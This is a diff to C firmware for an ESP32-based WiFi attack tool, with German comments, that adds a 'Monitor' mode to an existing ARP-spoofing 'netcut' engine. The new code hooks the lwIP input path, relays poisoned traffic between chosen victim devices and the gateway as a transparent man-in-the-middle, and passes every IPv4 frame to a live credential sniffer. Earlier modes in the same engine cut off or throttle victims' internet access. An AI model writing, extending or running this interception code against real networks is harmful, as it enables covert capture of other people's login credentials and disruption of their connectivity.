@@ -1,5 +1,6 @@
 #include "wlan_netcut.h"
 #include "wlan_hal.h"
+#include "wlan_cred_sniff.h"
 
 #include <esp_log.h>
 #include <esp_netif.h>
@@ -36,6 +37,7 @@ typedef enum {
     WlanNetcutModeIdle = 0,
     WlanNetcutModeCut,
     WlanNetcutModeThrottle,
+    WlanNetcutModeMonitor, // ARP-MITM + Frame unverändert weiterleiten (Cred-Sniff)
 } WlanNetcutMode;
 
 typedef struct {
@@ -78,6 +80,8 @@ static WlanNetcut* s_hook_engine = NULL;
 static struct netif* s_hooked_netif = NULL;
 static netif_input_fn s_original_input = NULL;
 static uint8_t s_fwd_buf[NETCUT_FWD_BUF_SIZE];
+// Optionaler Live-Credential-Dissektor (siehe wlan_netcut_set_cred_sniff).
+static WlanCredSniff* s_hook_cred = NULL;
 
 static bool mac_eq(const uint8_t* a, const uint8_t* b) {
     return memcmp(a, b, 6) == 0;
@@ -236,24 +240,46 @@ static volatile uint32_t s_hook_dropped = 0;
 static volatile uint32_t s_hook_forwarded = 0;
 static volatile uint32_t s_hook_passed = 0;
 static volatile uint32_t s_hook_last_log_total = 0;
+// Erste paar Hook-Calls vollständig dumpen — zeigt sofort ob der Hook
+// überhaupt feuert und welche Frames ankommen.
+static volatile uint32_t s_hook_log_remaining = 30;
+static volatile uint32_t s_mon_in = 0;
+static volatile uint32_t s_mon_out = 0;
+static volatile uint32_t s_mon_tx_fail = 0;
+static volatile uint32_t s_mon_copy_fail = 0;
+static volatile uint32_t s_mon_too_big = 0;
 
 static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
     WlanNetcut* nc = s_hook_engine;
     s_hook_total++;
-    // Nur grobe Statistik — bei jeder 200. Frame ein Sample, damit der Log
-    // nicht explodiert. Cut/Throttle würde sonst Hunderte Frames/s loggen.
-    if(s_hook_total - s_hook_last_log_total >= 200) {
+    bool verbose = false;
+    if(s_hook_log_remaining > 0) {
+        s_hook_log_remaining--;
+        verbose = true;
+    }
+    // Sample-Log alle 50 Frames (war 200), damit man die Frequenz sieht.
+    if(s_hook_total - s_hook_last_log_total >= 50) {
         s_hook_last_log_total = s_hook_total;
-        ESP_LOGI(TAG, "hook stats: total=%lu dropped=%lu forwarded=%lu passed=%lu "
-            "engine=%p devices=%u",
+        ESP_LOGI(TAG, "hook stats: total=%lu dropped=%lu fwd=%lu passed=%lu "
+            "mon_in=%lu mon_out=%lu tx_fail=%lu copy_fail=%lu too_big=%lu "
+            "engine=%p devs=%u",
             (unsigned long)s_hook_total,
             (unsigned long)s_hook_dropped,
             (unsigned long)s_hook_forwarded,
             (unsigned long)s_hook_passed,
+            (unsigned long)s_mon_in,
+            (unsigned long)s_mon_out,
+            (unsigned long)s_mon_tx_fail,
+            (unsigned long)s_mon_copy_fail,
+            (unsigned long)s_mon_too_big,
             nc,
             nc ? nc->device_count : 0);
     }
-    if(!nc || !p || p->len < SIZEOF_ETH_HDR) goto pass;
+    if(!nc || !p || p->len < SIZEOF_ETH_HDR) {
+        if(verbose) ESP_LOGI(TAG, "hook[%lu]: early-pass nc=%p p=%p len=%u",
+            (unsigned long)s_hook_total, nc, p, p ? p->len : 0);
+        goto pass;
+    }
 
     // Wenn apply() gerade die Tabelle umbaut (odd seq) → Frame durchlassen.
     uint32_t s1 = __atomic_load_n(&nc->hook_seq, __ATOMIC_ACQUIRE);
@@ -263,23 +289,75 @@ static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
     const uint8_t* src = eth->src.addr;
     const uint8_t* dst = eth->dest.addr;
 
+    if(verbose) {
+        ESP_LOGI(TAG,
+            "hook[%lu]: src=%02x:%02x:%02x:%02x:%02x:%02x "
+            "dst=%02x:%02x:%02x:%02x:%02x:%02x type=0x%04x len=%u tot=%u",
+            (unsigned long)s_hook_total,
+            src[0], src[1], src[2], src[3], src[4], src[5],
+            dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
+            lwip_ntohs(eth->type), p->len, p->tot_len);
+    }
+
+    // ---- Live-Credential-Dissektor-Tap (read-only, non-blocking) ----------
+    // Läuft für jeden IPv4-Frame, unabhängig vom Device-Mode. Der per-Frame-
+    // memcpy wird übersprungen, wenn niemand mitliest (Tap nicht gearmt).
+    if(s_hook_cred && wlan_cred_sniff_armed(s_hook_cred) &&
+       lwip_ntohs(eth->type) == ETHTYPE_IP && p->tot_len <= NETCUT_FWD_BUF_SIZE) {
+        uint16_t cl = p->tot_len;
+        if(pbuf_copy_partial(p, s_fwd_buf, cl, 0) == cl) {
+            wlan_cred_sniff_feed_eth(s_hook_cred, s_fwd_buf, cl);
+        }
+    }
+
     uint8_t count = nc->device_count;
     if(count > WLAN_APP_MAX_DEVICES) count = WLAN_APP_MAX_DEVICES;
 
     int idx = -1;
     bool inbound = false; // gateway → victim
-    for(uint8_t i = 0; i < count; i++) {
-        if(mac_eq(nc->devices[i].mac, src)) {
-            idx = i;
-            inbound = false;
-            break;
+    bool src_is_gw = nc->gw_mac_valid && mac_eq(src, nc->gw_mac);
+    if(src_is_gw) {
+        // GW → uns. Bei Monitor/Throttle hat der GW die Antwort an unsere MAC
+        // adressiert (weil wir den Opfer-Request mit src=my_mac neu eingespeist
+        // haben) — wir müssen daher über die L3-Destination-IP entscheiden,
+        // an welches Opfer der Frame eigentlich gehört.
+        if(lwip_ntohs(eth->type) == ETHTYPE_IP &&
+           p->tot_len >= SIZEOF_ETH_HDR + 20) {
+            uint8_t hdr[SIZEOF_ETH_HDR + 20];
+            if(pbuf_copy_partial(p, hdr, sizeof(hdr), 0) == sizeof(hdr)) {
+                uint32_t dst_ip;
+                memcpy(&dst_ip, hdr + SIZEOF_ETH_HDR + 16, 4);
+                for(uint8_t i = 0; i < count; i++) {
+                    if(mac_eq(nc->devices[i].mac, nc->gw_mac)) continue;
+                    if(nc->devices[i].ip == dst_ip) {
+                        idx = i;
+                        inbound = true;
+                        break;
+                    }
+                }
+            }
         }
-    }
-    if(idx < 0 && nc->gw_mac_valid && mac_eq(src, nc->gw_mac)) {
+        // Fallback: GW antwortet (noch ohne Poison-Wirkung) direkt an die
+        // echte Opfer-MAC, oder Broadcast/Multicast → eth.dst matchen.
+        if(idx < 0) {
+            for(uint8_t i = 0; i < count; i++) {
+                if(mac_eq(nc->devices[i].mac, nc->gw_mac)) continue;
+                if(mac_eq(nc->devices[i].mac, dst)) {
+                    idx = i;
+                    inbound = true;
+                    break;
+                }
+            }
+        }
+    } else {
+        // Nicht-GW-Quelle → outbound (Opfer → ...). GW-Eintrag in der
+        // Device-Liste explizit überspringen, damit er nicht versehentlich
+        // matcht (kommt vor wenn der LAN-Scan den GW als Device aufnimmt).
         for(uint8_t i = 0; i < count; i++) {
-            if(mac_eq(nc->devices[i].mac, dst)) {
+            if(mac_eq(nc->devices[i].mac, nc->gw_mac)) continue;
+            if(mac_eq(nc->devices[i].mac, src)) {
                 idx = i;
-                inbound = true;
+                inbound = false;
                 break;
             }
         }
@@ -293,6 +371,11 @@ static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
 
     WlanNetcutDevice* d = &nc->devices[idx];
     WlanNetcutMode mode = (WlanNetcutMode)d->mode;
+    if(verbose) {
+        ESP_LOGI(TAG, "hook[%lu]: matched idx=%d inbound=%d mode=%d dev_mac=%02x:%02x:%02x:%02x:%02x:%02x",
+            (unsigned long)s_hook_total, idx, inbound, mode,
+            d->mac[0], d->mac[1], d->mac[2], d->mac[3], d->mac[4], d->mac[5]);
+    }
     if(mode == WlanNetcutModeIdle) goto pass;
 
     bool drop = false;
@@ -343,6 +426,48 @@ static err_t netcut_input_hook(struct pbuf* p, struct netif* inp) {
             }
         }
         d->throttle_bucket = bucket;
+    } else if(mode == WlanNetcutModeMonitor) {
+        // Transparenter MITM: Frame aus dem eigenen Stack absorbieren und
+        // unverändert (nur L2-Header korrigiert) zum echten Next-Hop
+        // weiterleiten — der Cred-Sniffer hat ihn oben bereits gesehen.
+        // Non-IPv4 (ARP etc.) NICHT droppen, sonst funktioniert das Opfer nicht.
+        bool ipv4 = lwip_ntohs(eth->type) == ETHTYPE_IP;
+        uint16_t pkt_len = p->tot_len;
+        if(ipv4 && pkt_len <= NETCUT_FWD_BUF_SIZE) {
+            drop = true;
+            if(pbuf_copy_partial(p, s_fwd_buf, pkt_len, 0) == pkt_len) {
+                if(inbound) {
+                    memcpy(s_fwd_buf, d->mac, 6); // dst = echtes Opfer
+                    memcpy(s_fwd_buf + 6, nc->my_mac, 6); // src bleibt my_mac
+                } else {
+                    memcpy(s_fwd_buf, nc->gw_mac, 6); // dst = echter Gateway
+                    memcpy(s_fwd_buf + 6, nc->my_mac, 6);
+                }
+                bool ok = wlan_hal_send_eth_raw(s_fwd_buf, pkt_len);
+                s_hook_forwarded++;
+                if(inbound) s_mon_in++;
+                else s_mon_out++;
+                if(!ok) s_mon_tx_fail++;
+                if(verbose) {
+                    ESP_LOGI(TAG,
+                        "monitor[%s]: idx=%d len=%u tx=%d (mon_in=%lu out=%lu fail=%lu)",
+                        inbound ? "IN" : "OUT", idx, pkt_len, ok,
+                        (unsigned long)s_mon_in, (unsigned long)s_mon_out,
+                        (unsigned long)s_mon_tx_fail);
+                }
+            } else {
+                s_mon_copy_fail++;
+                if(verbose)
+                    ESP_LOGW(TAG, "monitor[%s]: pbuf_copy_partial failed len=%u",
+                        inbound ? "IN" : "OUT", pkt_len);
+            }
+        } else if(ipv4) {
+            s_mon_too_big++;
+            if(verbose)
+                ESP_LOGW(TAG, "monitor[%s]: frame too big len=%u (max %u)",
+                    inbound ? "IN" : "OUT", pkt_len, NETCUT_FWD_BUF_SIZE);
+        }
+        // Non-IPv4 fällt durch → drop bleibt false → lwIP behandelt
     }
 
     if(drop) {
@@ -368,7 +493,17 @@ static void install_l2_hook(WlanNetcut* nc) {
     s_hooked_netif = nif;
     s_hook_engine = nc;
     UNLOCK_TCPIP_CORE();
-    ESP_LOGI(TAG, "L2 hook installed");
+    s_hook_log_remaining = 30; // bei jedem Install frische Verbose-Phase
+    s_mon_in = s_mon_out = s_mon_tx_fail = s_mon_copy_fail = s_mon_too_big = 0;
+    const uint8_t* m = nif->hwaddr;
+    const ip4_addr_t* ip4 = netif_ip4_addr(nif);
+    const uint8_t* ip = (const uint8_t*)&ip4->addr;
+    ESP_LOGI(TAG, "L2 hook installed on netif name=%c%c num=%u flags=0x%02x "
+        "mac=%02x:%02x:%02x:%02x:%02x:%02x ip=%u.%u.%u.%u orig_input=%p",
+        nif->name[0], nif->name[1], nif->num, nif->flags,
+        m[0], m[1], m[2], m[3], m[4], m[5],
+        ip[0], ip[1], ip[2], ip[3],
+        s_original_input);
 }
 
 static void uninstall_l2_hook(void) {
@@ -490,8 +625,14 @@ WlanNetcut* wlan_netcut_alloc(void) {
 void wlan_netcut_free(WlanNetcut* nc) {
     if(!nc) return;
     wlan_netcut_stop(nc);
+    s_hook_cred = NULL;
     if(nc->mutex) furi_mutex_free(nc->mutex);
     free(nc);
+}
+
+void wlan_netcut_set_cred_sniff(WlanNetcut* nc, WlanCredSniff* cs) {
+    UNUSED(nc);
+    s_hook_cred = cs;
 }
 
 bool wlan_netcut_preflight(WlanNetcut* nc) {
@@ -612,10 +753,10 @@ bool wlan_netcut_apply(WlanNetcut* nc, const WlanDeviceRecord* devices, uint8_t 
         const uint8_t* ip = (const uint8_t*)&dr->ip;
         const uint8_t* m = dr->mac;
         ESP_LOGI(TAG, "apply: in[%u] ip=%u.%u.%u.%u mac=%02x:%02x:%02x:%02x:%02x:%02x "
-            "active=%d block=%d throttle=%u",
+            "active=%d block=%d monitor=%d throttle=%u",
             i, ip[0], ip[1], ip[2], ip[3],
             m[0], m[1], m[2], m[3], m[4], m[5],
-            dr->active, dr->block_internet, dr->throttle_kbps);
+            dr->active, dr->block_internet, dr->sniff_monitor, dr->throttle_kbps);
     }
 
     bool any_active = false;
@@ -637,6 +778,8 @@ bool wlan_netcut_apply(WlanNetcut* nc, const WlanDeviceRecord* devices, uint8_t 
         uint16_t throttle = 0;
         if(dr->block_internet) {
             mode = WlanNetcutModeCut;
+        } else if(dr->sniff_monitor) {
+            mode = WlanNetcutModeMonitor;
         } else if(dr->throttle_kbps) {
             mode = WlanNetcutModeThrottle;
             throttle = dr->throttle_kbps;
